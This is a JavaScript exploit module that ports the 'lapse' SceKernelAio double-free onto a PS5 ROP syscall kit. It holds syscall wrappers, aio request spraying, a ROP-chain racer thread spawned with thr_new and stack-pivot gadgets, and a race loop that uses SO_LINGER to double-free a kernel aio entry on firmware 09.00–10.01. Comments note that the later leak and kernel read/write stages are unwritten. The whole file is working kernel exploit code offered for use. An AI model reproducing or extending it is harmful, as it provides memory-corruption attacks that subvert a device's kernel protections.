/* lapse-ps5.js — SceKernelAio double-free ("lapse"), ported from
 * ufm42/cobolt's public/lapse.js onto this kit's ROP syscall path.
 *
 * WHAT THIS IS
 * ------------
 * A THIRD kernel bug, unrelated to the other two the kit carries:
 *
 *   netctrl  netcontrol UAF     09.00 - 12.00   seconds
 *   p2jb     cr_refcnt overflow 12.02 - 12.70   ~50 minutes
 *   lapse    aio double free    09.00 - 10.01   seconds   <- this file
 *
 * FIRMWARE RANGE — READ THIS BEFORE USING IT
 * ------------------------------------------
 * lapse is documented as working up to 10.01, and the kernels agree that
 * something changed after that. Diffing _aio_multi_delete between kernel_1000
 * and kernel_1200 (found via sysent[0x296], which is a CFI thunk to the real
 * worker at 0xFFFFFFFF805FF1E0 / 0xFFFFFFFF8066A850) the two functions share
 * only ~55% of their normalised instruction stream, and 12.00 specifically adds
 * paired guards where 10.00 branched directly:
 *     setne r8b ; setb cl ; test r8b, cl ; je ...
 * plus extra `cmp word [rax+4],0` / `cmp byte [rax+0x..],0` state checks and an
 * SCE_KERNEL_ERROR_ESRCH store on a path 10.00 does not have. That is the shape
 * of a hardened id/state validation.
 *
 * I did NOT prove the bug is dead on 12.x — only that the function was reworked
 * in exactly the area the race depends on. So this file is gated to 09.00-10.01
 * and will refuse anything above it rather than race a patched kernel.
 *
 * WHY IT IS WORTH HAVING ANYWAY
 * -----------------------------
 * On the firmwares it covers, lapse should be a far EASIER race for this kit
 * than netcontrol is. netcontrol needs a genuinely tight window, which is
 * brutal at ~0.4 ms per ROP syscall. lapse does not race the scheduler at all:
 * it puts SO_LINGER on the socket so that soclose() SLEEPS inside
 * _fdrop(), and then wins at leisure while the other thread is parked in the
 * kernel. A 0.4 ms syscall is irrelevant against a one-second sleep.
 *
 * SCOPE
 * -----
 * Implemented and self-contained here: the syscall layer, the request builder,
 * the aio spray/process helpers, the race thread, and double_free_reqs2 — the
 * novel part, i.e. everything up to and including a double-freed aio_entry.
 * The stages after it (leak_kaddrs, double_free_reqs1, the pktopts-twins
 * make_karw) are NOT written yet; run() stops with an explicit message rather
 * than pretending. Nothing here has been run on hardware.
 */
"use strict";

(function () {

/* ------------------------------------------------------------ constants */

// Verified against syscallnames[] in kernel_900/1000/1001/1020/1060/1100/1200 —
// identical on every one, so the numbers are not firmware-dependent.
const SYS = {
    accept: 30, getsockname: 32, connect: 98, bind: 104, listen: 106,
    socket: 97, close: 6, setsockopt: 105, getsockopt: 118, thr_new: 455,
    thr_exit: 431, read: 3, write: 4, pipe2: 687,
    aio_multi_delete: 0x296, aio_multi_wait: 0x297, aio_multi_poll: 0x298,
    aio_multi_cancel: 0x29a, aio_submit_cmd: 0x29d,
};

const AF_INET = 2, SOCK_STREAM = 1;
const SOL_SOCKET = 0xffff, SO_REUSEADDR = 4, SO_LINGER = 0x80;
const TCP_INFO = 0x20, IPPROTO_TCP = 6, TCP_INFO_SIZE = 0xec;
// struct tcp_info's first byte is tcpi_state. 4 = TCPS_ESTABLISHED, i.e. the
// connection has NOT started tearing down yet — which means soclose() has not
// reached sodisconnect and the racer is not parked where we need it.
const TCPS_ESTABLISHED = 4;

/* 3 requests * sizeof(SceKernelAioRWRequest) = 3 * 0x28 = 0x78, which lands in
 * the 0x80 malloc zone. That sizing is the whole point: the freed entry has to
 * share a zone with something we can spray. */
const SIZEOF_AIO_RW_REQUEST = 0x28;
const NUM_REQS = 3;
const AIO_MAX_NUM = 0x80;
const ATTEMPT_NUM = 0x80;

const AIO_CMD_READ = 1, AIO_CMD_MULTI = 0x1000;
const AIO_PRIORITY_HIGH = 3;
const AIO_OP_CANCEL = 1, AIO_OP_WAIT = 2, AIO_OP_POLL = 4, AIO_OP_DELETE = 8;
const AIO_WAIT_AND = 1;
const AIO_STATE_COMPLETE = 3, AIO_STATE_ABORTED = 4;
const SCE_KERNEL_ERROR_ESRCH = 0x80020003;

const THR_PARAM_SIZE = 0x68;
const THR_STACK_SIZE = 0x8000;
const THR_CHAIN_SIZE = 0x200;

/* --------------------------------------------------------------- plumbing */

const S = (n) => BigInt(n);
const hex = (v) => "0x" + BigInt(v).toString(16);

function log(m) {
    const sk = window.slopkit;
    if (sk && sk.mark) sk.mark("LAPSE " + m);
    else console.log("[lapse] " + m);
}

function rw() {
    const r = window.rop_worker;
    if (!r || typeof r.syscallSync !== "function")
        throw new Error("lapse: rop_worker not loaded");
    return r;
}

function sc(name, ...args) {
    const num = SYS[name];
    if (num === undefined) throw new Error("lapse: no syscall number for " + name);
    const r = rw().syscallSync(num, ...args);
    return Number(BigInt.asIntN(64, r.retval));
}

const alloc = (n) => rw().alloc(n);
const wr64 = (a, o, v) => window.write64(BigInt(a) + BigInt(o), BigInt(v));
const rd64 = (a, o) => BigInt(window.read64(BigInt(a) + BigInt(o)));
const wr32 = (a, o, v) => window.write32(BigInt(a) + BigInt(o), Number(v) >>> 0);
const rd32 = (a, o) => Number(window.read32(BigInt(a) + BigInt(o))) >>> 0;
function bzero(a, n) { for (let i = 0; i < n; i += 8) wr64(a, i, 0n); }

let G = null;                       // absolute gadget addresses
function gadgets() {
    if (G) return G;
    const sk = window.slopkit || {};
    const fw = String(sk.FW_VERSION || "");
    G = window.netctrl_ps5 && window.netctrl_ps5.gadgetsFor
        ? window.netctrl_ps5.gadgetsFor(fw) : null;
    if (!G) throw new Error("lapse: no gadget table for fw " + fw);
    return G;
}

/* ------------------------------------------------------------- aio layer */

const ST = {
    reqs1: 0n, ids: 0n, outs: 0n, tmp: 0n,
    server_sock: -1, server_addr: 0n,
};

/* reqs1 is the array aio_submit_cmd copies in.
 *
 * The default fd is -1 and that matters: EXACTLY ONE request may reference the
 * client socket. Setting fd on all three (which the first version did) gives
 * the socket three references, so the racer's aio_multi_delete of a single
 * request drops one and leaves two — the file never reaches refcount 0,
 * soclose() is never called, and the connection stays ESTABLISHED. That is
 * precisely what 128/128 attempts reported: poll=0x10004 tcp_state=4, with no
 * variance at all, which is the signature of a structural bug rather than a
 * lost race. The caller sets reqs1[which].fd per attempt instead. */
function build_reqs1(count, fd) {
    if (fd === undefined) fd = -1;
    bzero(ST.reqs1, SIZEOF_AIO_RW_REQUEST * AIO_MAX_NUM);
    for (let i = 0; i < count; i++) {
        const o = i * SIZEOF_AIO_RW_REQUEST;
        wr64(ST.reqs1, o + 0x08, fd === -1 ? 0n : 1n);   // nbyte
        wr32(ST.reqs1, o + 0x20, fd >>> 0);              // fd
    }
}

// Point one request at a socket, leaving the others at fd -1.
function set_req_fd(idx, fd) {
    wr32(ST.reqs1, idx * SIZEOF_AIO_RW_REQUEST + 0x20, fd >>> 0);
}

function spray_aio(cmd, num_reqs, idsAddr, count) {
    const step = (cmd & AIO_CMD_MULTI) ? num_reqs : 1;
    const n = (cmd & AIO_CMD_MULTI) ? Math.floor(count / step) : count;
    for (let i = 0; i < n * step; i += step) {
        sc("aio_submit_cmd", S(cmd), ST.reqs1, S(num_reqs),
           S(AIO_PRIORITY_HIGH), BigInt(idsAddr) + BigInt(i * 4));
    }
}

function process_aio(op, idsAddr, offset, count) {
    let off = offset, left = count;
    while (left > 0) {
        const step = Math.min(left, AIO_MAX_NUM);
        const a = BigInt(idsAddr) + BigInt(off * 4);
        if (op & AIO_OP_CANCEL) sc("aio_multi_cancel", a, S(step), ST.outs);
        if (op & AIO_OP_WAIT)   sc("aio_multi_wait", a, S(step), ST.outs, S(AIO_WAIT_AND), 0n);
        if (op & AIO_OP_POLL)   sc("aio_multi_poll", a, S(step), ST.outs);
        if (op & AIO_OP_DELETE) sc("aio_multi_delete", a, S(step), ST.outs);
        left -= step; off += step;
    }
}

/* ---------------------------------------------------------- race thread */

/* A racer that is ALREADY PARKED IN THE KERNEL, woken per attempt.
 *
 * The first version spawned a fresh thread per attempt and lost every time:
 * "poll says ESRCH — entry already gone" on 6/6 attempts. thr_new costs a full
 * ROP round trip (~0.4 ms), and the new thread ran its one syscall to
 * completion inside that window, so by the time this side issued its poll the
 * entry was already deleted. cobolt never has that gap — its racer sits on a
 * condvar and signal_work() wakes it in microseconds.
 *
 * So mirror that: spawn ONE thread up front whose chain is
 *     loop: read(wake_r, 1)            <- blocks in the kernel, ready to go
 *           aio_multi_delete(...)
 *           write(done_w, 1)           <- "finished", the wait_for_finished()
 *           jump back to loop
 * The loop-back is the same `pop rdi, <addr>; mov rsp, rdi; ret` construct p2jb
 * uses, because there is still no branch gadget in either module.
 *
 * Waking it and polling then go out as ONE batched chain (see the attempt
 * loop), so they are microseconds apart on the same thread instead of two
 * round trips. */
const RACER = { tid: 0n, wake: [0, 0], done: [0, 0], buf: 0n, spawned: false };

function spawnDeleteRacer(idsAddr, outsAddr) {
    if (RACER.spawned) return RACER;
    const g = gadgets();

    const pb = alloc(8);
    if (sc("pipe2", BigInt(pb), 0n) !== 0) throw new Error("lapse: pipe2(wake)");
    RACER.wake = [rd32(pb, 0) | 0, rd32(pb, 4) | 0];
    if (sc("pipe2", BigInt(pb), 0n) !== 0) throw new Error("lapse: pipe2(done)");
    RACER.done = [rd32(pb, 0) | 0, rd32(pb, 4) | 0];
    RACER.buf = BigInt(alloc(8));
    wr64(RACER.buf, 0, 0n);

    const chain = alloc(THR_CHAIN_SIZE);
    const stack = alloc(THR_STACK_SIZE);
    const param = alloc(THR_PARAM_SIZE);
    const tid = alloc(0x18);
    bzero(tid, 0x18);

    let o = 0n;
    const put = (v) => { wr64(chain, o, v); o += 8n; };
    const call3 = (num, a1, a2, a3) => {
        put(g.pop_rdi); put(a1);
        put(g.pop_rsi); put(a2);
        put(g.pop_rdx); put(a3);
        put(g.pop_rax); put(BigInt(num));
        put(g.syscall_wrapper);
    };

    const loopHead = BigInt(chain) + o;
    call3(SYS.read, S(RACER.wake[0]), RACER.buf, 1n);          // park here
    call3(SYS.aio_multi_delete, BigInt(idsAddr), 1n, BigInt(outsAddr));
    call3(SYS.write, S(RACER.done[1]), RACER.buf, 1n);         // signal finished
    put(g.pop_rdi); put(loopHead);
    put(g.pivot_rdi_rsp);

    bzero(param, THR_PARAM_SIZE);
    wr64(param, 0x00, g.pivot_rdi_rsp);     // start_func: rsp := arg
    wr64(param, 0x08, BigInt(chain));       // arg -> rdi -> the chain
    wr64(param, 0x10, BigInt(stack));
    wr64(param, 0x18, BigInt(THR_STACK_SIZE));
    wr64(param, 0x30, BigInt(tid));
    wr64(param, 0x38, BigInt(tid));

    const rv = sc("thr_new", BigInt(param), S(THR_PARAM_SIZE));
    if (rv !== 0) throw new Error("lapse: thr_new(racer) -> " + rv);
    RACER.tid = BigInt(tid);
    RACER.spawned = true;
    log("racer parked: wake=" + RACER.wake.join("/")
        + " done=" + RACER.done.join("/"));
    return RACER;
}

/* Block until the racer says it finished its delete — cobolt's
 * race_worker.wait_for_finished(). */
function waitRacer() {
    sc("read", S(RACER.done[0]), RACER.buf, S(1));
}

/* --------------------------------------------------------------- checks */

/* A won race leaves the entry double-freed; cobolt recognises it by the entry
 * still carrying heap pointers where a clean free would have zeroed them.
 * Kernel heap addresses on PS5 are 0xffff_xxxx_xxxx_xxxx. */
function verify_reqs2(buf) {
    const looksHeap = (v) => (v >> 48n) === 0xffffn;
    const cmd = rd32(buf, 0x00);
    if ((cmd & 0xffff) !== (AIO_CMD_READ | AIO_CMD_MULTI) &&
        (cmd & 0xffff) !== AIO_CMD_READ) return false;
    for (const off of [0x10, 0x18, 0x20, 0x28]) {
        const v = rd64(buf, off);
        if (v !== 0n && !looksHeap(v)) return false;
    }
    return true;
}

/* ------------------------------------------------------------- the race */

function setupServer() {
    const sa = alloc(0x10);
    bzero(sa, 0x10);
    // struct sockaddr_in: len(1) family(1) port(2,BE) addr(4,BE) zero(8)
    wr32(sa, 0x00, (AF_INET << 8) | 0x10);
    wr32(sa, 0x04, 0x0100007f);                 // 127.0.0.1
    ST.server_addr = BigInt(sa);

    const s = sc("socket", S(AF_INET), S(SOCK_STREAM), 0n);
    if (s < 0) throw new Error("lapse: server socket -> " + s);

    const one = alloc(4); wr32(one, 0, 1);
    sc("setsockopt", S(s), S(SOL_SOCKET), S(SO_REUSEADDR), BigInt(one), S(4));

    if (sc("bind", S(s), ST.server_addr, S(0x10)) !== 0)
        throw new Error("lapse: bind failed");

    const alen = alloc(4); wr32(alen, 0, 0x10);
    if (sc("getsockname", S(s), ST.server_addr, BigInt(alen)) !== 0)
        throw new Error("lapse: getsockname failed");

    if (sc("listen", S(s), S(1)) !== 0)
        throw new Error("lapse: listen failed");

    ST.server_sock = s;
    const port = ((rd32(ST.server_addr, 0) >>> 16) & 0xffff);
    log("server fd=" + s + " port=" + ((port >> 8) | ((port & 0xff) << 8)));
}

function double_free_reqs2() {
    setupServer();

    const linger = alloc(8);
    wr32(linger, 0x00, 1);          // l_onoff
    wr32(linger, 0x04, 1);          // l_linger = 1s: soclose() will SLEEP

    const which = NUM_REQS - 1;
    const idsAddr = ST.ids;
    const idsWhich = BigInt(idsAddr) + BigInt(which * 4);
    const outs1 = BigInt(ST.outs) + 4n;    // racer writes its error here

    // TCP_INFO scratch, allocated once: the state byte is read every attempt.
    const info = alloc(TCP_INFO_SIZE);
    const infoLen = alloc(4);

    /* Build the request template ONCE, with every fd at -1. Only reqs1[which]
     * is re-pointed at each attempt's socket; the other two must stay at -1 so
     * the socket has exactly one reference for the racer's delete to drop. */
    build_reqs1(NUM_REQS, -1);

    // Park the racer ONCE, before the loop — see spawnDeleteRacer.
    spawnDeleteRacer(idsWhich, outs1);

    for (let attempt = 0; attempt < ATTEMPT_NUM; attempt++) {
        const client = sc("socket", S(AF_INET), S(SOCK_STREAM), 0n);
        if (client < 0) throw new Error("lapse: client socket -> " + client);
        if (sc("connect", S(client), ST.server_addr, S(0x10)) !== 0)
            throw new Error("lapse: connect failed");
        const conn = sc("accept", S(ST.server_sock), 0n, 0n);
        if (conn < 0) throw new Error("lapse: accept -> " + conn);

        // make soclose() sleep — this is what turns a tight race into a wide one
        sc("setsockopt", S(client), S(SOL_SOCKET), S(SO_LINGER), BigInt(linger), S(8));

        // ONE request references the socket — see build_reqs1.
        set_req_fd(which, client);
        bzero(idsAddr, NUM_REQS * 4);
        spray_aio(AIO_CMD_READ | AIO_CMD_MULTI, NUM_REQS, idsAddr, NUM_REQS);

        /* Check the submit actually produced ids. aio_submit_cmd's return was
         * being discarded, and a failed submit is indistinguishable downstream
         * from a lost race: no request would hold the socket, close() would
         * drop it immediately, and every attempt would look wrong for a reason
         * nothing in the log names. */
        const id0 = rd32(idsAddr, which * 4);
        if (id0 === 0) {
            sc("close", S(client)); sc("close", S(conn));
            throw new Error("lapse: aio_submit_cmd produced no id for req "
                            + which + " — nothing holds the socket");
        }

        process_aio(AIO_OP_CANCEL | AIO_OP_POLL, idsAddr, 0, NUM_REQS);

        // drop our reference so the racer's delete is the one that _fdrop()s
        sc("close", S(client));

        /* Wake the racer and poll in ONE chain. Two separate syscalls here is
         * what lost the race every time: each is a ~0.4 ms round trip, and the
         * delete finished inside the gap. Batched, the poll is issued
         * microseconds after the wake byte lands, while the racer is still
         * being scheduled into aio_multi_delete. */
        wr32(ST.outs, 0x00, 0);
        wr32(ST.outs, 0x04, 0);
        rw().syscallBatch([
            [SYS.write, S(RACER.wake[1]), RACER.buf, 1n],
            [SYS.aio_multi_poll, idsWhich, 1n, ST.outs],
        ]);
        const pollErr = rd32(ST.outs, 0);

        /* The REAL proof, and what the first version was missing.
         *
         * A non-ESRCH poll alone means nothing — it only says the entry still
         * existed. What shows the racer is parked INSIDE soclose() (and so that
         * two frees are in flight on one entry) is the connection having
         * already left ESTABLISHED: soclose's SO_LINGER path calls sodisconnect
         * before it sleeps. cobolt requires both, and without the tcp_state
         * half every "win" would be a false positive. */
        wr32(infoLen, 0x00, TCP_INFO_SIZE);
        const gso = sc("getsockopt", S(conn), S(IPPROTO_TCP), S(TCP_INFO),
                       BigInt(info), BigInt(infoLen));
        const tcpState = gso === 0 ? (rd32(info, 0x00) & 0xff) : -1;

        let won = false;
        if (pollErr !== SCE_KERNEL_ERROR_ESRCH && tcpState !== TCPS_ESTABLISHED) {
            // Confirming delete on the same entry — this is the second free.
            process_aio(AIO_OP_DELETE, idsAddr, which, 1);
            won = true;
        }

        waitRacer();

        if (won) {
            /* Both the racer's delete and ours must have returned 0. If either
             * errored the entry was not freed twice and continuing would spray
             * against a chunk that is still live. */
            const e0 = rd32(ST.outs, 0x00), e1 = rd32(ST.outs, 0x04);
            if (e0 === 0 && e1 === 0) {
                log("attempt " + attempt + ": WON — poll=" + hex(pollErr)
                    + " tcp_state=" + tcpState + " errs=0/0 (double free)");
                process_aio(AIO_OP_DELETE, idsAddr, 0, NUM_REQS);
                sc("close", S(conn));
                return { ids: idsAddr, which: which, attempt: attempt };
            }
            log("attempt " + attempt + ": race looked won but errs=" + hex(e0)
                + "/" + hex(e1) + " — not a clean double free");
        } else {
            log("attempt " + attempt + ": lost (poll=" + hex(pollErr)
                + " tcp_state=" + tcpState + ")");
        }

        /* MEMLEAK, as cobolt notes: a won race decrements ao_num_reqs twice and
         * leaves one request undeleted. Clean up what we can either way. */
        process_aio(AIO_OP_DELETE, idsAddr, 0, NUM_REQS);
        sc("close", S(conn));
    }
    throw new Error("lapse: lost the aio double-free race in " + ATTEMPT_NUM
                    + " attempts");
}

/* ----------------------------------------------------------------- init */

function init() {
    ST.reqs1 = BigInt(alloc(SIZEOF_AIO_RW_REQUEST * AIO_MAX_NUM));
    ST.ids   = BigInt(alloc(4 * AIO_MAX_NUM));
    ST.outs  = BigInt(alloc(4 * AIO_MAX_NUM));
    ST.tmp   = BigInt(alloc(0x100));
    bzero(ST.reqs1, SIZEOF_AIO_RW_REQUEST * AIO_MAX_NUM);
    bzero(ST.ids, 4 * AIO_MAX_NUM);
    bzero(ST.outs, 4 * AIO_MAX_NUM);
    gadgets();
    log("init ok reqs1=" + hex(ST.reqs1) + " ids=" + hex(ST.ids));
}

const LAPSE_FIRMWARES = new Set(["09.00", "09.20", "09.40", "09.60",
                                 "10.00", "10.01"]);

function run() {
    const sk = window.slopkit || {};
    const fw = String(sk.FW_VERSION || "");
    if (!LAPSE_FIRMWARES.has(fw)) {
        log("fw " + fw + " is outside lapse's window (09.00-10.01). "
            + "_aio_multi_delete was reworked after 10.01 — see this file's "
            + "header — so racing it here is not supported.");
        return false;
    }

    init();
    const won = double_free_reqs2();
    log("double_free_reqs2 won on attempt " + won.attempt);

    /* Deliberately stops here rather than pretending.
     *
     * What remains, in cobolt's order: leak_kaddrs (reclaim the freed entry
     * with an rthdr spray and read the kernel pointers out of it),
     * double_free_reqs1, then make_karw via pktopts twins. The last of those
     * maps closely onto machinery netctrl-ps5.js already has (find_twins /
     * find_triplet / the pipe-based KRW), so it is the leak stage that is the
     * real remaining work, not the R/W. */
    throw new Error("lapse: double free achieved; leak_kaddrs / "
                    + "double_free_reqs1 / make_karw are not implemented yet");
}

window.lapse_ps5 = {
    run, init, double_free_reqs2, build_reqs1, spray_aio, process_aio,
    spawnDeleteRacer, verify_reqs2, ST, SYS, LAPSE_FIRMWARES,
    version: "lapse-ps5 0.1 (double-free stage only)",
};
log("loaded — " + window.lapse_ps5.version);

})();
